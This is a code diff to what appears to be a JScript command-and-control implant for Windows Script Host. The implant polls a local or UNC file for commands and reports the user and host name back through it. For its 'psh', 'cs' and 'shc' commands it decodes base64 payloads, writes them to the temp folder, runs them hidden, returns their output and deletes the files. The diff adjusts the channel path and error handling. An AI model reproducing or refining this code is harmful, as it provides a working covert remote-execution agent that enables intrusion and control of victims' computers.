@@ -1,5 +1,5 @@
 //Define variables
-var home = 'C:\\users\\kclark\\desktop\\test3.txt' // UNC or local path. Send and receive data through this file
+var home = 'C:\\test3.txt' // UNC or local path. Send and receive data through this file
 var sleepytime = 2000 //in milliseconds
 
 var runner = new ActiveXObject("WScript.Shell")
@@ -46,7 +46,6 @@ function smb_post(home, response) {
   else {
     empty = true
   }
-
 
   if((empty) || (updata !== checkin+"\r\n")) { // Windows adds a \r\n at the end of file reads
     var fdw = fso.OpenTextFile(home, 2) // mode 2 = write
@@ -196,26 +195,26 @@ while(true)
 
           //psh and cs
           else if((cmnd.split(" ")[0] == "psh") || (cmnd.split(" ")[0] == "cs") || (cmnd.split(" ")[0] == "shc")) {
-             fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
-             msb = cmnd.split(" ")[1]
-             msbdata = b64d(cmnd.split(" ")[2], "txt")
-             fd.WriteLine(msbdata)
-             fd.close()
-             if(cmnd.split(" ")[0] == "shc") {
-               runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
-               retval = "[*] Shc cmnd appeared successful"
-             }
-             else {
-               runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
-             }
-             if(fso.FileExists(temp + "\\__" + id + ".txt")) {
-               fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
-               retval = fd.ReadAll()
-               fd.close()
-               fso.DeleteFile(temp + "\\__" + id + ".txt", true)
-             }
-             if(fso.FileExists(temp + "\\" + id + ".txt")) {
-               fso.DeleteFile(temp + "\\" + id + ".txt", true)
+            fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
+            msb = cmnd.split(" ")[1]
+            msbdata = b64d(cmnd.split(" ")[2], "txt")
+            fd.WriteLine(msbdata)
+            fd.close()
+            if(cmnd.split(" ")[0] == "shc") {
+              runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
+              retval = "[*] Shc cmnd appeared successful"
+            }
+            else {
+              runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
+            }
+            if(fso.FileExists(temp + "\\__" + id + ".txt")) {
+              fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
+              retval = fd.ReadAll()
+              fd.close()
+              fso.DeleteFile(temp + "\\__" + id + ".txt", true)
+            }
+            if(fso.FileExists(temp + "\\" + id + ".txt")) {
+              fso.DeleteFile(temp + "\\" + id + ".txt", true)
             }
           }
               
@@ -282,6 +281,7 @@ while(true)
     }
   }
   catch (e) {
+    checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //error - set as idle checkin
     WScript.Sleep(sleepytime);
   }
   WScript.Sleep(sleepytime);
